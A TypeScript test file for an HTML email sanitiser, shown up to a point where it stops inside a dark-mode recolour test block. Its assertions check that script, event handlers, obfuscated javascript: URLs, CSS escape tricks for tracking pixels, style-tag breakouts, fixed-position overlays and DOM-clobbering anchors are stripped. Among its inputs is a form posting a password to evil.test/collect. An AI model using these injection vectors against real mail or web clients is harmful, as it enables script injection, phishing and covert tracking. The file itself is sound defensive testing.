/**
 * The sanitiser, tested as an attacker would use it.
 *
 * Every case here is a thing a real message does or a real sender has tried; the
 * assertions are on what survives rather than on implementation. Where a rule
 * exists to stop a specific historical failure the test says which one. The file
 * is `.ts` (plain Node environment) and nothing touches `document`, so the same
 * sanitiser runs in the app, tests and the render proxy's Node process without a
 * DOM shim.
 */

import { describe, expect, it } from "vitest";
import { countRemoteReferences } from "./html";
import {
  emailDocument,
  emailDocumentCss,
  inlineEmailCss,
  inlineEmailDarkCss,
  sanitizeCss,
  sanitizeMailHtml,
  type SanitizeOptions,
} from "./sanitize";
import { DARK_EMAIL_PALETTE, OLED_EMAIL_PALETTE, contrast, parseColor } from "./emailDark";

/** Sanitise with remote content allowed — the "user said yes" case. */
const allowed: SanitizeOptions = { allowRemote: true };
/** Sanitise with remote content withheld — the default. */
const blocked: SanitizeOptions = { allowRemote: false };

const clean = (html: string, options: Partial<SanitizeOptions> = {}): string =>
  sanitizeMailHtml(html, { ...blocked, ...options }).html;

// ── Script and its carriers ────────────────────────────────────────────────

describe("script never survives", () => {
  it("drops the element and everything inside it", () => {
    expect(clean("<p>before</p><script>alert(1)</script><p>after</p>")).toBe(
      "<p>before</p><p>after</p>",
    );
  });

  it("is not fooled by a comparison operator inside the script body", () => {
    // The failure mode that rules out tokenising raw-text elements: `a > b` in
    // script source closes the element if the scanner hunts for the next `>`.
    // The text after it would then be parsed as markup.
    const result = clean("<script>if (a<b && c>d) { alert(1) }</script><p>hi</p>");
    expect(result).toBe("<p>hi</p>");
    expect(result).not.toContain("alert");
  });

  it("drops an unterminated script by taking the rest of the document with it", () => {
    // An unclosed `<script>` runs to the end of the input. Anything else leaves
    // its body to be parsed as markup, which is how `<script>alert(1)` written
    // without a closing tag turns into live text.
    expect(clean("<p>hi</p><script>alert(1)")).toBe("<p>hi</p>");
  });

  it("drops event handlers on elements that are otherwise kept", () => {
    const result = clean('<p onclick="steal()" onmouseover="x()">text</p>');
    expect(result).toBe("<p>text</p>");
  });

  it("drops an event handler whose name is only an on-prefix after decoding", () => {
    expect(clean('<p o&#110;click="x()">t</p>')).toBe("<p>t</p>");
  });

  it("drops svg and its contents, because svg is a document", () => {
    // `<svg><script>` and `<svg onload>` are the two ways an `<svg>` in mail
    // becomes script. Both die with the element.
    const result = clean('<div><svg onload="x()"><script>alert(1)</script></svg><p>ok</p></div>');
    expect(result).toBe("<div><p>ok</p></div>");
  });

  it("drops an iframe, and does not keep its fallback contents", () => {
    expect(clean('<iframe src="https://evil.test">fallback</iframe>')).toBe("");
  });

  it("drops objects, embeds, forms and their controls", () => {
    for (const html of [
      '<object data="x.swf"></object>',
      '<embed src="x.swf">',
      '<form action="https://evil.test/collect"><input name="password"></form>',
      '<button onclick="x()">click</button>',
      "<template><script>alert(1)</script></template>",
    ]) {
      expect(clean(html)).toBe("");
    }
  });

  it("counts what it dropped, so the reader can say so", () => {
    expect(sanitizeMailHtml("<script>a</script><iframe></iframe><p>x</p>").droppedElements).toBe(2);
  });
});

// ── URL schemes ────────────────────────────────────────────────────────────

describe("url schemes", () => {
  it("drops javascript: however it is spelled", () => {
    for (const href of [
      "javascript:alert(1)",
      "JaVaScRiPt:alert(1)",
      // Entities. The browser decodes these before it reads the scheme, so a
      // check on the raw value judges them innocent.
      "&#106;avascript:alert(1)",
      "java&Tab;script:alert(1)",
      // Control characters. `java\tscript:` is live in every engine.
      "java\tscript:alert(1)",
      "java\nscript:alert(1)",
      "\u0000javascript:alert(1)",
      // Protocol-relative is not a scheme at all, so it cannot smuggle one.
      "\u0001javascript:alert(1)",
    ]) {
      expect(clean(`<a href="${href}">x</a>`)).not.toContain("href");
    }
  });

  it("drops vbscript:, data:text/html and data:image/svg+xml", () => {
    // SVG is excluded on purpose: it is a document, and a document can script.
    for (const href of [
      "vbscript:msgbox(1)",
      "data:text/html,<script>alert(1)</script>",
      "data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+",
    ]) {
      expect(clean(`<a href="${href}">x</a>`)).not.toContain("href");
    }
  });

  it("keeps inert data: images", () => {
    const src = "data:image/png;base64,iVBORw0KGgo=";
    expect(clean(`<img src="${src}" alt="dot">`)).toContain(`src="${src}"`);
  });

  it("keeps mailto, tel and http links even when remote content is withheld", () => {
    // Withholding a *fetch* is not withholding a *link*. A message whose only
    // button is `mailto:` still has to be usable, and the reader routes these
    // clicks to the system browser anyway.
    expect(clean('<a href="mailto:a@b.test">mail</a>')).toContain('href="mailto:a@b.test"');
    expect(clean('<a href="tel:+15550100">call</a>')).toContain('href="tel:+15550100"');
    expect(clean('<a href="https://example.test/">go</a>')).toContain('href="https://example.test/"');
  });

  it("does not treat a link's address as a fetch", () => {
    // The distinction the reader's note rests on: blocking images must not
    // inflate the count with every anchor in the message.
    const result = sanitizeMailHtml('<a href="https://example.test/a">x</a><img src="https://cdn.test/p.gif">');
    expect(result.blockedRemote).toBe(1);
  });

  it("escapes the URL it keeps rather than trusting it", () => {
    expect(clean('<a href="https://x.test/?a=1&b=2">l</a>')).toContain("a=1&amp;b=2");
  });

  it("rewrites a protocol-relative URL to https when it is allowed", () => {
    expect(clean('<img src="//cdn.test/a.png">', allowed)).toContain('src="https://cdn.test/a.png"');
  });
});

// ── Withheld remote content ────────────────────────────────────────────────

describe("withheld remote content", () => {
  it("counts every reference it refuses and keeps the element", () => {
    const result = sanitizeMailHtml(
      '<img src="https://cdn.test/1.png"><img src="https://cdn.test/2.png">',
    );
    expect(result.blockedRemote).toBe(2);
    // The address moves to a data attribute, which is what lets the reader say
    // what it withheld. What must not survive is anything a browser would fetch.
    expect(result.html).not.toMatch(/\ssrc=/);
    expect(result.html).not.toMatch(/\ssrcset=/);
    expect(result.html.match(/data-wn-blocked-src/g)).toHaveLength(2);
  });

  it("agrees with remoteReferences about how many there are", () => {
    // The two numbers are shown to the user as the same fact by two different
    // functions, so they had better be the same number.
    for (const html of [
      '<img src="https://cdn.test/a.png">',
      '<img src="https://cdn.test/a.png"><img src="https://cdn.test/b.png">',
      '<table background="https://cdn.test/bg.png"><tr><td>x</td></tr></table>',
      '<div style="background-image:url(https://cdn.test/t.png)">x</div>',
      '<img srcset="https://cdn.test/a.png 1x, https://cdn.test/b.png 2x">',
      '<img src="data:image/png;base64,iVBORw0KGgo=">',
      '<p>text mentioning https://example.test and no markup at all</p>',
    ]) {
      const sanitised = sanitizeMailHtml(html, blocked);
      expect(
        sanitised.blockedRemote,
        `mismatch for ${html}: counted ${sanitised.blockedRemote}, remoteReferences says ${countRemoteReferences(html)}`,
      ).toBe(countRemoteReferences(html));
    }
  });

  it("withholds a remote background but keeps a colour one", () => {
    // `background` is the attribute that carries both, and conflating them is the
    // most common false positive in mail: `background="#ffffff"` is not a request.
    expect(clean('<td background="#ffffff">x</td>')).toContain('background="#ffffff"');
    expect(clean('<td background="https://cdn.test/bg.png">x</td>')).not.toContain("cdn.test");
  });

  it("withholds a remote url() in a style attribute", () => {
    const result = sanitizeMailHtml('<div style="background:url(https://cdn.test/t.png)">x</div>');
    expect(result.blockedRemote).toBe(1);
    expect(result.html).not.toContain("cdn.test");
  });

  it("keeps a fragment url() in a style attribute", () => {
    // `url(#gradient)` is a local reference, not a request.
    expect(clean('<div style="fill:url(#gradient)">x</div>')).toContain("url(#gradient)");
  });

  it("drops only the unsupported candidates of a srcset", () => {
    const result = sanitizeMailHtml(
      '<img srcset="https://cdn.test/a.png 1x, data:image/gif;base64,R0lGOD 2x">',
      allowed,
    );
    expect(result.html).toContain("https://cdn.test/a.png 1x");
  });
});

// ── CSS ────────────────────────────────────────────────────────────────────

describe("sanitizeCss", () => {
  it("removes every way CSS can fetch", () => {
    expect(sanitizeCss('@import url("https://cdn.test/a.css"); p { color: red }')).not.toContain("@import");
    expect(sanitizeCss("p { background: url(https://cdn.test/a.png) }")).not.toContain("cdn.test");
    expect(sanitizeCss("p { width: expression(alert(1)) }")).not.toContain("expression(");
    expect(sanitizeCss("p { behavior: url(x.htc) }")).not.toContain("behavior: url");
    expect(sanitizeCss("p { -moz-binding: url(x.xml) }")).not.toContain("-moz-binding");
  });

  it("sees through a comment that splits a keyword", () => {
    // Comments are stripped first precisely so this cannot survive.
    expect(sanitizeCss("p { width: expr/**/ession(alert(1)) }")).not.toContain("ession(");
  });

  it("keeps a data: url, which is bytes already in the message", () => {
    expect(sanitizeCss("p { background: url(data:image/png;base64,iVBOR) }")).toContain("data:image/png");
  });

  it("leaves ordinary declarations alone", () => {
    expect(sanitizeCss("p { color: #333; font-size: 14px; margin: 0 0 1em }")).toContain("color: #333");
  });
});

// ── Structure ──────────────────────────────────────────────────────────────

describe("structure", () => {
  it("keeps the body of a message that arrived as a whole document", () => {
    // Most HTML mail is a full document. Treating `html`/`body`/`head` as
    // elements to skip empties the reader of exactly the messages the rich view
    // exists to show.
    const html = "<html><head><title>x</title></head><body><p>hello</p></body></html>";
    expect(clean(html)).toBe("<p>hello</p>");
  });

  it("does not let a void element swallow the message", () => {
    // `<meta>` and `<link>` are dropped with their contents, and neither *has* a
    // contents — so the search for `</meta>` runs to the end of the document and
    // concludes the element is unterminated. Every real HTML message opens with
    // `<head><meta charset="utf-8">`, so the bug is not an edge case: it emptied
    // the reader of essentially every newsletter, silently, with no error anywhere.
    const html =
      "<!doctype html><html><head><meta charset=\"utf-8\">" +
      "<link rel=\"stylesheet\" href=\"https://cdn.test/a.css\">" +
      "<title>ignored</title></head><body><h1>Hark pro is here</h1><p>hello</p></body></html>";
    expect(clean(html)).toBe("<h1>Hark pro is here</h1><p>hello</p>");
  });

  it("survives a body with nothing but a charset declaration", () => {
    expect(clean('<html><head><meta charset="utf-8"></head><body><p>x</p></body></html>')).toBe("<p>x</p>");
  });

  it("closes what the sender left open", () => {
    // No browser cared about the missing `</td>`, because no browser was
    // re-parenting anything. Injected into a document that does care, an
    // unbalanced table swallows everything after it.
    expect(clean("<table><tr><td>a<td>b<tr><td>c</table>")).toBe(
      "<table><tr><td>a</td><td>b</td></tr><tr><td>c</td></tr></table>",
    );
  });

  it("drops an end tag with nothing open", () => {
    expect(clean("<p>a</p></td></tr></table>")).toBe("<p>a</p>");
  });

  it("keeps the contents of an element it does not recognise", () => {
    // An unrecognised element in mail is nearly always a wrapper.
    expect(clean("<v:roundrect><p>hi</p></v:roundrect>")).toBe("<p>hi</p>");
  });

  it("keeps table layout, which is how HTML mail is built", () => {
    const html = '<table role="presentation" cellpadding="0"><tr><td valign="top">x</td></tr></table>';
    expect(clean(html)).toContain("<table");
    expect(clean(html)).toContain('valign="top"');
    expect(clean(html)).toContain('cellpadding="0"');
  });

  it("marks pre blocks with data-wn-code-block for copy buttons", () => {
    const html = "<pre>const x = 1;</pre>";
    const result = clean(html);
    expect(result).toContain('data-wn-code-block=""');
  });

  it("keeps the table attributes that carry a layout", () => {
    const html = '<table border="0" cellspacing="0" width="600" bgcolor="#ffffff" align="center">';
    const result = clean(html);
    expect(result).toContain('cellspacing="0"');
    expect(result).toContain('width="600"');
    expect(result).toContain('bgcolor="#ffffff"');
    expect(result).toContain('align="center"');
  });

  it("escapes a text `<` rather than eating it", () => {
    expect(clean("<p>a < b and c > d</p>")).toBe("<p>a &lt; b and c &gt; d</p>");
  });

  it("survives an attribute value containing `>`", () => {
    // A scanner that stops at the first `>` mangles this into two tags.
    expect(clean('<a title="1 > 0">x</a>')).toContain('title="1 &gt; 0"');
  });

  it("survives mismatched quotes without emitting the rest as markup", () => {
    // An unterminated quoted attribute value means there is no closing `>`, so
    // there is no tag. This scanner gives up on the `<` and resumes one character
    // later, where a browser would swallow the rest of the document as the
    // attribute's value — so the two differ on exactly which elements are real.
    // What has to hold either way is that nothing executable comes out the far
    // end, which is what the assertion is about rather than about parity.
    const result = clean('<p title="unterminated>text</p><img src=x onerror=alert(1)>');
    expect(result).toContain("&lt;p");
    expect(result).not.toContain("onerror");
    expect(result).not.toMatch(/\ssrc=/);
    expect(result).not.toContain("<script");
  });

  it("drops conditional comments, whose contents are markup", () => {
    expect(clean("<p>a</p><!--[if mso]><table><tr><td>hidden</td></tr></table><![endif]-->")).toBe("<p>a</p>");
  });

  it("clamps a dimension rather than dropping it", () => {
    // A dropped `width` is always wrong; the clamped one is usually still right.
    expect(clean('<img src="x.png" width="99999" height="12">')).toContain('width="4096"');
    expect(clean('<img src="x.png" width="12" height="12">')).toContain('width="12"');
  });

  it("unwraps a document nested absurdly deep rather than rendering it", () => {
    const deep = "<div>".repeat(500) + "x" + "</div>".repeat(500);
    const result = clean(deep);
    expect(result).toContain("x");
    // The depth is bounded, so the tail of the stack is closed for us.
    expect(result.split("<div>").length - 1).toBeLessThanOrEqual(64);
  });

  it("caps its own output and says so", () => {
    // A truncated message that looks complete is the one failure mode here that
    // produces no visible symptom, so it is reported rather than silent.
    const huge = "<p>x</p>".repeat(400_000);
    const result = sanitizeMailHtml(huge);
    expect(result.truncated).toBe(true);
    expect(result.html.length).toBeLessThan(huge.length);
  });

  it("rounds an empty body into something the reader can mount", () => {
    expect(clean("")).toBe("");
    expect(clean("<!-- nothing but a comment -->")).toBe("");
  });
});

// ── Inline parts ───────────────────────────────────────────────────────────

describe("inline cid: parts", () => {
  const dot = "data:image/gif;base64,R0lGODlhAQABAAAAACw=";

  it("resolves a cid: to the message's own bytes", () => {
    // A marketing email's logo is a `cid:`, not a URL. Without this substitution
    // half of real HTML mail has a hole where its logo is, and the hole is
    // counted as a withheld *remote* reference when nothing remote is involved.
    const result = sanitizeMailHtml('<img src="cid:logo@marketing.test">', {
      ...blocked,
      inlineParts: { "logo@marketing.test": dot },
    });
    expect(result.html).toContain(`src="${dot}"`);
    expect(result.blockedRemote).toBe(0);
  });

  it("matches the id whether or not it arrived bracketed", () => {
    for (const reference of ["cid:logo@x.test", "cid:<logo@x.test>"]) {
      const result = sanitizeMailHtml(`<img src="${reference}">`, {
        ...blocked,
        inlineParts: { "logo@x.test": dot },
      });
      expect(result.html).toContain(dot);
    }
  });

  it("drops a cid: with no matching part, and does not count it as remote", () => {
    const result = sanitizeMailHtml('<img src="cid:missing@x.test">', blocked);
    expect(result.blockedRemote).toBe(0);
    expect(result.html).not.toContain("cid:");
  });
});

// ── Links out of the message ───────────────────────────────────────────────

describe("links in a rendered message", () => {
  it("gives every link the attributes the container's click handler relies on", () => {
    const result = clean('<a href="https://example.test/">go</a>');
    expect(result).toContain('target="_blank"');
    expect(result).toContain('rel="noopener noreferrer nofollow"');
  });

  it("overrides a sender-chosen target rather than trusting it", () => {
    // `<a target="_top">` in a message aimed at a frame is a navigation escape.
    expect(clean('<a href="https://x.test/" target="_top">go</a>')).not.toContain('target="_top"');
  });

  it("overrides a sender-chosen rel", () => {
    expect(clean('<a href="https://x.test/" rel="opener">go</a>')).not.toContain('rel="opener"');
  });

  it("keeps a fragment link, which never leaves the document", () => {
    expect(clean('<a href="#section-2">jump</a>')).toContain('href="#section-2"');
  });
});

// ── Stylesheets ────────────────────────────────────────────────────────────

describe("collected stylesheets", () => {
  it("returns them sanitised and out of the body either way", () => {
    const html = "<style>@import 'https://cdn.test/a.css'; p { color: red }</style><p>x</p>";
    const dropped = sanitizeMailHtml(html, { ...blocked, collectStyles: false });
    expect(dropped.stylesheets).toHaveLength(1);
    expect(dropped.stylesheets[0]).not.toContain("@import");
    // Not in the body, which is what makes `collectStyles: false` safe.
    expect(dropped.html).not.toContain("color: red");
  });

  it("finds a stylesheet inside the head of a full document", () => {
    const result = sanitizeMailHtml(
      "<html><head><style>p{color:red}</style></head><body><p>x</p></body></html>",
      { ...blocked, collectStyles: true },
    );
    expect(result.stylesheets).toHaveLength(1);
    expect(result.html).toBe("<p>x</p>");
  });

  it("does not let a stylesheet close itself early", () => {
    const result = sanitizeMailHtml("<style>p{content:'</style><script>alert(1)</script>'}</style>", blocked);
    expect(result.html).not.toContain("script");
    expect(result.stylesheets.join("")).not.toContain("</style>");
  });

  it("ignores an empty stylesheet", () => {
    expect(sanitizeMailHtml("<style></style><p>x</p>", { collectStyles: true }).stylesheets).toHaveLength(0);
  });
});

// ── The two serialisations of the baseline ─────────────────────────────────

describe("the baseline stylesheet", () => {
  it("scopes every inline rule to the message container", () => {
    // One rule that escaped the scope would be a rule that can restyle the
    // reader, so the assertion is that no selector is a bare element.
    const css = inlineEmailCss();
    const selectors = [...css.matchAll(/([^{}]+)\{/g)].map((m) => m[1].trim());
    expect(selectors.length).toBeGreaterThan(0);
    for (const selector of selectors) {
      for (const part of selector.split(",")) {
        expect(part.trim().startsWith("[data-wn-email]")).toBe(true);
      }
    }
  });

  it("roots the document form at body instead", () => {
    expect(emailDocument("", [])).toContain("<body data-wn-email>");
    expect(emailDocument("", [])).toContain("body { margin: 0");
  });

  it("builds a document that carries the sender's css in its own head", () => {
    const document = emailDocument("<p>x</p>", ["p { color: red }"]);
    expect(document).toContain("<style>p { color: red }</style>");
    // Before the baseline, so a sender's own rule wins where the two overlap —
    // which is the point of a baseline rather than a stylesheet.
    expect(document.indexOf("p { color: red }")).toBeLessThan(
      document.indexOf(emailDocumentCssProbe()),
    );
  });

  it("declares a light colour scheme on the document it builds", () => {
    // The symptom this fixes: a white newsletter rendered as a white block on a
    // black pane, because the document claimed a light surface it did not have.
    expect(emailDocument("<p>x</p>")).toContain('name="color-scheme" content="light"');
  });
});

/** A unique slice of the document baseline, for an ordering assertion. */
function emailDocumentCssProbe(): string {
  return emailDocumentCss().split("\n")[0].slice(0, 40);
}
/**
 * The rewrite map is the render proxy's contract, and its whole value is that it
 * is *exhaustive* for fetches.
 *
 * The proxy sanitises with `allowRemote: true` and a map of the addresses it has
 * already fetched itself. That combination is only safe because a map, once
 * supplied, becomes the complete list of remote addresses the document may fetch:
 * anything absent is withheld and counted. Without that clause a loopback literal
 * in a message would pass straight through `allowRemote: true` and into a document
 * the *reader's* browser acts on — which is the single request the proxy exists to
 * ensure is made by the server and nobody else.
 */
describe("rewriteUrls", () => {
  const fetched = new Map([["https://cdn.test/a.png", "/asset/aaa"]]);

  it("substitutes an address the map holds", () => {
    const result = sanitizeMailHtml('<img src="https://cdn.test/a.png">', {
      allowRemote: true,
      rewriteUrls: fetched,
    });
    expect(result.html).toContain('src="/asset/aaa"');
    expect(result.blockedRemote).toBe(0);
  });

  it("substitutes inside a stylesheet, which a second pass over the document forgets", () => {
    const result = sanitizeMailHtml("<style>.a{background:url(https://cdn.test/a.png)}</style>", {
      allowRemote: true,
      collectStyles: true,
      rewriteUrls: fetched,
    });
    expect(result.stylesheets.join("")).toContain("url('/asset/aaa')");
  });

  it("withholds and counts an address the map does not hold", () => {
    const result = sanitizeMailHtml('<img src="http://127.0.0.1/x.png">', {
      allowRemote: true,
      rewriteUrls: new Map(),
    });
    expect(result.html).not.toMatch(/\ssrc=/);
    expect(result.blockedRemote).toBe(1);
  });

  it("leaves an anchor alone, because a link is not a fetch", () => {
    const result = sanitizeMailHtml('<a href="https://cdn.test/landing">go</a>', {
      allowRemote: true,
      rewriteUrls: new Map(),
    });
    expect(result.html).toContain('href="https://cdn.test/landing"');
    expect(result.blockedRemote).toBe(0);
  });

  it("is absent by default, so the app is unaffected by any of this", () => {
    const result = sanitizeMailHtml('<img src="https://cdn.test/a.png">', {
      allowRemote: true,
    });
    expect(result.html).toContain('src="https://cdn.test/a.png"');
  });
});

/**
 * Three ways a tracking pixel got through with images switched off.
 *
 * All three were found in review rather than by a fuzzer, and all three were
 * confirmed against the shipped code before anything was changed. What they have in
 * common is that the rule was a pattern looking for the literal text `url(`, and CSS
 * is a language in which that text is not the only spelling of a fetch:
 *
 *   - `u\72l(...)` is `url(...)`, because a parser decodes escapes before it reads
 *     the function name. The pixel loaded and the note said nothing was blocked.
 *   - `image-set("..." 1x)` has no `url(` in it at all. Same result.
 *   - `url(".../a b.png")` has a space in it, and the pattern stopped at the space.
 *     This one loaded *and* was counted as blocked, which is the failure worth
 *     never shipping: a privacy note saying the opposite of the truth.
 */
describe("css fetches the url( pattern missed", () => {
  const PIXEL = "https://track.example/p.gif";
  /** Sanitise a style attribute with remote content off, the way a blocked image is. */
  const style = (value: string) =>
    sanitizeMailHtml(`<div style="${value.replace(/"/g, "&quot;")}">x</div>`, {
      allowRemote: false,
    });

  it("sees through a CSS escape on the function name", () => {
    const result = style(`background:u\\72l(${PIXEL})`);
    expect(result.html).not.toContain("track.example");
    expect(result.blockedRemote).toBe(1);
  });

  it("sees image-set, which has no url( in it", () => {
    const result = style(`background:image-set("${PIXEL}" 1x)`);
    expect(result.html).not.toContain("track.example");
    expect(result.blockedRemote).toBe(1);
  });

  it("sees a url() with a space in the path", () => {
    const result = style(`background:url("https://track.example/a b.png")`);
    expect(result.html).not.toContain("track.example");
    // And counted, which the space used to break in the other direction.
    expect(result.blockedRemote).toBe(1);
  });

  it("sees the prefixed spellings and an upper-case name", () => {
    for (const value of [
      `background:-webkit-image-set("${PIXEL}" 1x)`,
      `background:URL(${PIXEL})`,
      `background:Url("${PIXEL}")`,
    ]) {
      const result = style(value);
      expect(result.html, value).not.toContain("track.example");
      expect(result.blockedRemote, value).toBe(1);
    }
  });

  it("applies the same rule inside a <style> block", () => {
    const result = sanitizeMailHtml(`<style>.a{background:u\\72l(${PIXEL})}</style>`, {
      allowRemote: false,
      collectStyles: true,
    });
    expect(result.stylesheets.join("")).not.toContain("track.example");
  });

  it("leaves an inert url() alone, and keeps the rest of the declaration", () => {
    // The rewrite cost these caused: splitting the argument on commas broke
    // `data:image/png;base64,iVBOR`, whose base64 half does not start with `data:`,
    // so a perfectly inline image was replaced with `none`.
    const result = sanitizeMailHtml(
      `<div style="background:url(data:image/png;base64,iVBOR);color:#333;margin:0">x</div>`,
    );
    expect(result.html).toContain("data:image/png");
    expect(result.html).toContain("color:#333");
    expect(result.html).toContain("margin:0");
    expect(result.blockedRemote).toBe(0);
  });

  it("keeps a gradient, which is a function and not a fetch", () => {
    const result = sanitizeMailHtml(
      '<div style="background:linear-gradient(#fff,#000)">x</div>',
    );
    expect(result.html).toContain("linear-gradient");
  });

  it("drops a declaration carrying a quoted scheme it did not recognise", () => {
    // The belt to the braces above: whatever the function walk did not recognise,
    // a quoted string naming a scheme is a fetch.
    expect(sanitizeCss(`a{background:whatever("https://x.test/a.png")}`)).not.toContain("x.test");
  });
});

/**
 * A message must not be able to draw over the app.
 *
 * The container is the app's own document, so a sender's `position: fixed` panel
 * with `inset: 0` is a full-screen fake — a "your session expired, sign in" form
 * laid over the real one — and `overflow-x: auto` does not stop it, because a
 * scroll container does not clip fixed-position descendants. Two independent
 * defences, because either alone has a gap: the declarations are neutralised, and
 * the container establishes containment and its own stacking context so that
 * anything which slips past cannot escape.
 */
describe("a message cannot leave its container", () => {
  it("neutralises position: fixed and position: sticky", () => {
    for (const value of ["position:fixed", "position: sticky", "POSITION:FIXED"]) {
      const result = sanitizeMailHtml(`<div style="${value};inset:0;z-index:9999">x</div>`);
      expect(result.html, value).not.toMatch(/position\s*:\s*(fixed|sticky)/i);
      expect(result.html, value).not.toMatch(/z-index/i);
    }
  });

  it("still allows ordinary positioning", () => {
    const result = sanitizeMailHtml('<div style="position:relative;top:2px">x</div>');
    expect(result.html).toContain("position:relative");
    expect(result.html).toContain("top:2px");
  });

  it("drops @font-face, which fetches a font from a URL", () => {
    expect(sanitizeCss(`@font-face{src:url(https://x.test/f.woff)}`)).not.toContain("@font-face");
  });

  it("establishes containment and a stacking context on the container", () => {
    // The part that catches `class="fixed inset-0 z-50"`, which picks up Tailwind
    // utilities from the app's own stylesheet and cannot be reached by filtering
    // style attributes at all.
    const css = inlineEmailCss();
    const container = css.match(/\[data-wn-email\]\s*\{([^}]*)\}/)?.[1] ?? "";
    expect(container).toMatch(/contain:\s*layout paint/);
    expect(container).toMatch(/isolation:\s*isolate/);
  });

  it("keeps `class`, because the original view needs the sender's own stylesheet", () => {
    // Dropping `class` would close the Tailwind hole too, and would also stop the
    // "as sent" document from applying the stylesheet it deliberately keeps. The
    // containment above is the fix; this is the reason not to use the blunt one.
    expect(sanitizeMailHtml('<div class="hero">x</div>').html).toContain('class="hero"');
  });
});

/**
 * Entities, which the first version got backwards.
 *
 * Text runs went through `escapeText` without being decoded first, so an `&amp;` in
 * a message body was escaped again and the reader saw `&amp;` where the sender had
 * written an ampersand. Attribute values were decoded correctly, which is why this
 * only ever showed up in prose — and essentially every newsletter contains one.
 */
describe("entities in body text", () => {
  it("renders one ampersand, not four characters", () => {
    expect(clean("<p>Tom &amp; Jerry</p>")).toBe("<p>Tom &amp; Jerry</p>");
  });

  it("decodes a non-breaking space and a numeric entity", () => {
    // `&nbsp;` is a real character, not the six characters `&nbsp;`.
    expect(clean("<p>a&nbsp;b</p>")).toBe("<p>a\u00a0b</p>");
    expect(clean("<p>Jerry&#8217;s</p>")).toBe("<p>Jerry\u2019s</p>");
  });

  it("leaves a bare ampersand alone rather than eating it", () => {
    // A recognised entity is decoded; an unrecognised one is left exactly as it is,
    // so "AT&T" survives the round trip intact.
    expect(clean("<p>AT&T and R&D</p>")).toBe("<p>AT&amp;T and R&amp;D</p>");
  });

  it("still escapes a decoded angle bracket, so decoding cannot inject markup", () => {
    // The whole risk of decoding first, stated as the thing that must still hold.
    expect(clean("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>")).toBe(
      "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>",
    );
  });

  it("does not decode twice on a doubly-escaped ampersand", () => {
    expect(clean("<p>&amp;amp;</p>")).toBe("<p>&amp;amp;</p>");
  });
});

/**
 * A named anchor creates a property on `window`.
 *
 * `<a name="config">` inside a message rendered into the app's own document defines
 * `window.config` — DOM clobbering, where an application reading an undeclared
 * global is silently reading an element a stranger controls. Nothing is lost by
 * dropping it: the reader keeps no `id`s, so a fragment link in a message goes
 * nowhere either way.
 */
describe("named anchors", () => {
  it("drops name, and keeps the href", () => {
    const result = clean('<a name="config" href="#section">x</a>');
    expect(result).not.toContain("name=");
    expect(result).toContain('href="#section"');
  });

  it("drops an id too, for the same reason", () => {
    expect(clean('<div id="root">x</div>')).toBe("<div>x</div>");
  });
});

/**
 * Decoding is for judging; emitting the decoded text is a change of meaning.
 *
 * The escape-decoding pass made the fetch walk see what a browser sees, and then
 * handed the decoded text to the output -- where `\3c /style\3e ` is a real
 * `</style>` that ends the element the sheet is re-homed into, and `\5c ` is a
 * backslash that the browser decodes a second time.
 */
describe("decoded css is re-escaped before it is emitted", () => {
  const PIXEL = "https://track.example/p.gif";
  const sheet = (css: string) =>
    sanitizeMailHtml(`<style>${css}</style><p>hi</p>`, { allowRemote: false, collectStyles: true });

  it("cannot end the style element with an escaped </style>", () => {
    const result = sheet(
      `p{color:red}\\3c /style\\3e \\3c img src=${PIXEL}\\3e \\3c meta http-equiv=refresh content=0\\3e `,
    );
    const css = result.stylesheets.join("");
    expect(css).not.toMatch(/<\//);
    const doc = emailDocument(result.html, result.stylesheets);
    // Exactly the two style elements the document builds, and no markup from the sheet.
    expect(doc.match(/<\/style/gi)).toHaveLength(2);
    // The sheet's text may still *mention* an img; it must not be outside the element.
    const afterFirstSheet = doc.slice(doc.search(/<\/style/i));
    expect(afterFirstSheet).not.toMatch(/<img|<meta http-equiv/i);
  });

  it("does not let an escaped backslash form a second escape for the browser", () => {
    const result = sheet(`.a{background:u\\5c 72l(${PIXEL})}`);
    const css = result.stylesheets.join("");
    // Whatever survives, the browser must not be able to decode it into `url(`.
    expect(css).not.toMatch(/u\\72l\(/i);
    expect(css).toContain("\\5c ");
  });

  it("strips a comment that only exists once escapes are decoded", () => {
    const result = sheet(`.a{background:ur\\2f\\2a x \\2a\\2fl(${PIXEL})}`);
    expect(result.stylesheets.join("")).not.toContain("track.example");
  });

  it("leaves ordinary css, data: images and media ranges alone", () => {
    const css = sheet(
      `@media (width < 600px){.a>b{color:#123}} .c{background:url(data:image/png;base64,iVBOR)}`,
    ).stylesheets.join("");
    expect(css).toContain("width < 600px");
    expect(css).toContain(".a>b");
    expect(css).toContain("data:image/png;base64,iVBOR");
  });

  it("emailDocument escapes </ in a sheet that did not come from the sanitiser", () => {
    const doc = emailDocument("<p>x</p>", ["p{}</style><img src=x>"]);
    expect(doc.match(/<\/style/gi)).toHaveLength(2);
    expect(doc.slice(doc.search(/<\/style/i))).not.toContain("<img");
  });
});


// ── Email dark mode's adaptive path (1.4.0) ──────────────────────────────────

describe("recolour", () => {
  const recolour = DARK_EMAIL_PALETTE;
  const hex = (html: string, pattern: RegExp) => pattern.exec(html)?.[1] ?? "";

  it("changes nothing when it is not asked for", () => {
    const html = '<table bgcolor="#ffffff"><tr><td style="color:#333;background:#fff">Hi</td></tr></table>';
    expect(clean(html)).toBe(clean(html, { recolour: undefined }));
    expect(clean(html)).toContain('bgcolor="#ffffff"');
    expect(clean(html)).toContain("color:#333;background:#fff");
  });

  it("recolours style attributes, bgcolor and color, to AA on the surface", () => {
    const out = clean('<table bgcolor="#FFFFFF"><tr><td style="color:#333333;border-top:1px solid #eeeeee">Hi</td></tr></table><hr color="#000">', { recolour });
    expect(out).toContain(`bgcolor="${recolour.surface.toLowerCase()}"`);
    const text = hex(out, /color:(#[0-9a-f]{6})/);
    expect(contrast(parseColor(text)!, parseColor(recolour.surface)!)).toBeGreaterThanOrEqual(4.5);
    expect(out).not.toMatch(/#eeeeee/i);
    expect(out).not.toContain('color="#000"');
  });

  it("holds text to AA against its own element's bgcolor", () => {
    const out = clean('<td bgcolor="#FFC107" style="color:#000000">Buy</td>', { recolour: OLED_EMAIL_PALETTE });
    const bg = hex(out, /bgcolor="(#[0-9a-f]{6})"/);
    const text = hex(out, /color:(#[0-9a-f]{6})/);
    expect(contrast(parseColor(text)!, parseColor(bg)!)).toBeGreaterThanOrEqual(4.5);
  });

